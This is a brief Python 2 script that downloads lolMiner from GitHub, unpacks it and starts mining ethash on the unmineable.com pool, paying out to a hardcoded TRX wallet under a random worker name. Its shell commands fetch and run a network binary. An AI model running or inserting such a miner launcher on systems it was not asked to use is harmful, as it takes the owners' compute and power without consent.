#!/bin/python2
from os import system
from time import sleep
from random import  randint

wall = "TPidhtNgpDDouvgE6unrLzsAbFBZW45CTj"

try:	
		n = randint(0, 999)
		system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz && tar -xvf lolMiner_v1.32a_Lin64.tar.gz")
		system("echo AAAA")
		system("cd 1.32a")
		system("./1.32a/lolMiner --algo ethash --pool  ethash.unmineable.com:3333 --user TRX:{}.MinerMiq_{} --tls 0".format( str(wall),  int(n)  ))
		

except Exception as err:
		print(" Error: ", err)
